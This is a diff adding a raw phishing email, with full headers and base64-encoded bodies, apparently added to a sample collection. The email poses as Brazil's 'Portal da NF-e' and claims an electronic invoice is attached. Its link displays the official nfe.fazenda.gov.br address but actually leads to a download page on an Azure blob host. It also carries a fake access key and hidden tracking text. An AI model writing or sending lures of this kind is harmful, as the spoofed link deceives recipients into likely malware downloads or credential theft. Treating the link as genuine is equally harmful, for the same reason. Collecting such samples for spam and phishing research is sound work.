@@ -1,0 +1,120 @@
+Return-Path: <scve@seby21.systemremap.com>
+Delivered-To: contato@soliveenergiasolar.com.br
+Received: from cpl02.main-hosting.eu
+	by cpl02.main-hosting.eu with LMTP
+	id 6OxBB8GhQ2buWgAAIElduQ
+	(envelope-from <scve@seby21.systemremap.com>)
+	for <contato@soliveenergiasolar.com.br>; Tue, 14 May 2024 17:39:13 +0000
+Return-path: <scve@seby21.systemremap.com>
+Envelope-to: contato@soliveenergiasolar.com.br
+Delivery-date: Tue, 14 May 2024 17:39:13 +0000
+Received: from seby21.systemremap.com ([138.197.172.153]:58622)
+	by cpl02.main-hosting.eu with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96.2)
+	(envelope-from <scve@seby21.systemremap.com>)
+	id 1s6w7M-00044y-1Q
+	for contato@soliveenergiasolar.com.br;
+	Tue, 14 May 2024 17:39:13 +0000
+Received: from localhost (localhost [127.0.0.1])
+	by seby21.systemremap.com (Postfix) with UTF8SMTP id 3B37C21828
+	for <contato@soliveenergiasolar.com.br>; Tue, 14 May 2024 17:37:36 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+ s=seby21; d=seby21.systemremap.com; t=1715708256;
+  h=from:subject:date:message-id:to:mime-version:content-type:
+ accept-language:user-agent:x-mailer:x-sender:content-language:
+ list-unsubscribe; bh=K9o7vCQ2roz4jrvOOHxQYtQK7ph0zyYQC5n/CJttktY=;
+ b=UkxGUgJhBIXK1YPidBuZ2DlKiN8uVNp+JPaMu4UIjbsoq0SqlSRJDm40aXOqewF4Anwjut
+ uFtLDojqU7PS3eXWQQQe/oDAPhhkCiJK6Y6Dp4YZPXjphDpvFx53ETc44vZkFT5uGIKi1Q
+ FXfRGHNB12A2EezNiLHMoO15FRpCQU0wzKYtKz5C8cQbyOQ/uLwE/1rN+t2PNphlpMVTAo
+ 3Qld0Y9quJ0sNlOzvFG/tiZ90yUmvGMAHKWpv0WmuSnXB2KuPoPENIcGciKATdr4AHQ9N3
+ 7HA+Kn5AotP75kUBbPIdkOIX9gnrdKFzKwRmv9EI0lHq9R0NAuddtgJvsKZvlQ==
+Subject: =?UTF-8?B?Tm90YSBGaXNjYWwgRWxldHLDtG5pY2E=?=
+X-Sender: scve@seby21.systemremap.com
+X-Mailer: Roundcube Webmail/1.4.13
+User-Agent: Roundcube Webmail/1.4.13
+Date: Tue, 14 May 2024 17:37:36 +0000
+MIME-Version: 1.0
+From: "Portal da NF-e" <scve@seby21.systemremap.com>
+Accept-Language: pt-BR, en-US
+Content-Language: pt-BR
+Message-Id: <ad67cdf217d4c94a41efcfe213c7d89a@seby21.systemremap.com>
+Content-Type: multipart/alternative;
+ boundary=2bb81fee962c008bc28317ee3aec1c71e2a5b0f85e3e00c435d7de29068e
+To: <contato@soliveenergiasolar.com.br>
+List-Unsubscribe: 
+ <https://seby21.systemremap.com/?action=unsubscribe&u=contato@soliveenergiasolar.com.br>
+X-Spam-Status: No, score=1.0
+X-Spam-Score: 10
+X-Spam-Bar: +
+X-Ham-Report: Spam detection software, running on the system "cpl02.main-hosting.eu",
+ has NOT identified this incoming email as spam.  The original
+ message has been attached to this so you can view it or label
+ similar future email.  If you have any questions, see
+ root\@localhost for details.
+ Content preview:  52284759 Caro(a) usuário(a), Pela venda de mercadoria e/ou
+    serviço segue em anexo os arquivos XML e PDF da Nota Fiscal Eletrônica.
+    
+ Content analysis details:   (1.0 points, 5.0 required)
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
+                             blocked.  See
+                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+                              for more information.
+                             [URIs: systemremap.com]
+  0.0 URIBL_DBL_BLOCKED_OPENDNS ADMINISTRATOR NOTICE: The query to
+                             dbl.spamhaus.org was blocked due to usage
+                             of an open resolver. See
+                             https://www.spamhaus.org/returnc/pub/
+                             [URIs: systemremap.com]
+  0.0 URIBL_ZEN_BLOCKED_OPENDNS ADMINISTRATOR NOTICE: The query to
+                             zen.spamhaus.org was blocked due to usage
+                             of an open resolver. See
+                             https://www.spamhaus.org/returnc/pub/
+                             [URIs: systemremap.com]
+ -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
+ -0.0 SPF_PASS               SPF: sender matches SPF record
+  0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+ -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
+  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
+                             valid
+ -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
+                             author's domain
+ -0.0 T_SCC_BODY_TEXT_LINE   No description available.
+  1.0 KAM_HTMLNOISE          Spam containing useless HTML padding
+  0.0 T_PDS_SHORT_SPOOFED_URL HTML message short and T_SPOOFED_URL
+                             (S_U_FP)
+X-Spam-Flag: NO
+
+--2bb81fee962c008bc28317ee3aec1c71e2a5b0f85e3e00c435d7de29068e
+Content-Transfer-Encoding: base64
+Content-Type: text/html; charset=UTF-8
+
+PGh0bWw+CjxoZWFkPgo8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+Cjx0aXRsZT41MjI4NDc1OTwvdGl0
+bGU+CjxzdHlsZT48L3N0eWxlPjwvaGVhZD4KCjxib2R5PgoJCkNhcm8oYSkgdXN1w6FyaW8oYSks
+IDxicj4KPGJyPgpQZWxhIHZlbmRhIGRlIG1lcmNhZG9yaWEgZS9vdSBzZXJ2acOnbyBzZWd1ZSBl
+bSBhbmV4byBvcyBhcnF1aXZvcyBYTUwgZSBQREYgZGEgTm90YSBGaXNjYWwgRWxldHLDtG5pY2Eu
+IDxicj4KPGJyPgpQYXJhIGNvbnN1bHRhciBhIE5GLWUsIGFjZXNzZSBvIHNpdGUgZG8gUG9ydGFs
+IEZpc2NhbC4gPGJyPgo8YnI+CjxhIGhyZWY9Imh0dHBzOi8vMDcwNTIwMjQyNS5ibG9iLmNvcmUu
+d2luZG93cy5uZXQvZG93bmxvYWQvaW5kZXguaHRtbCIgdGFyZ2V0PSJfYmxhbmsiIHJlbD0ibm9y
+ZWZlcnJlciI+aHR0cDovL3d3dy5uZmUuZmF6ZW5kYS5nb3YuYnIvcG9ydGFsPC9hPiA8YnI+CgoK
+PGJyPgo8dGFibGU+CiAgPHRib2R5PgogICAgPHRyPgogICAgICA8dGQ+Q2hhdmUgZGUgYWNlc3Nv
+IGRhIE5GLWU6PC90ZD4KICAgICAgPHRkPjYyODkyMjU4NDQ1MDQzMzwvdGQ+CiAgICA8L3RyPgog
+IDwvdGJvZHk+CjwvdGFibGU+Cjxicj4KPGJyPgpBdGVuY2lvc2FtZW50ZSwgPGJyPgo8YnI+ClBv
+cnRhbCBkYSBORi1lIDIwMjQgLSBOb3RhIEZpc2NhbCBFbGV0csO0bmljYSA8YnI+CjwvYm9keT4K
+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGZvbnQgY29sb3I9IiNFNkU2RTYi
+Pm5fNDJhN2ViYTYtMjY2Zi00NWZhLWExZWYtZmI1MzljMzJjNjYzPC9mb250PjwvaHRtbD4K
+--2bb81fee962c008bc28317ee3aec1c71e2a5b0f85e3e00c435d7de29068e
+Content-Transfer-Encoding: base64
+Content-Type: text/plain; charset=UTF-8
+
+Q2FybyhhKSB1c3XDoXJpbyhhKSwgDQogDQogUGVsYSB2ZW5kYSBkZSBtZXJjYWRvcmlhIGUvb3Ug
+c2VydmnDp28gc2VndWUgZW0gYW5leG8gb3MgYXJxdWl2b3MgWE1MIGUgUERGIGRhIE5vdGEgRmlz
+Y2FsIEVsZXRyw7RuaWNhLiANCiANCiBQYXJhIGNvbnN1bHRhciBhIE5GLWUsIGFjZXNzZSBvIHNp
+dGUgZG8gUG9ydGFsIEZpc2NhbC4gDQogDQogaHR0cHM6Ly8wNzA1MjAyNDI1LmJsb2IuY29yZS53
+aW5kb3dzLm5ldC9kb3dubG9hZC9pbmRleC5odG1sIA0KIA0KIENoYXZlIGRlIGFjZXNzbyBkYSBO
+Ri1lOiA2Mjg5MjI1ODQ0NTA0MzMgDQogDQogQXRlbmNpb3NhbWVudGUsIA0KIA0KIFBvcnRhbCBk
+YSBORi1lIDIwMjQgLSBOb3RhIEZpc2NhbCBFbGV0csO0bmljYSANCiANCg0KDQoNCg0KDQoNCg0K
+DQpuXzQyYTdlYmE2LTI2NmYtNDVmYS1hMWVmLWZiNTM5YzMyYzY2MyA=
+--2bb81fee962c008bc28317ee3aec1c71e2a5b0f85e3e00c435d7de29068e--
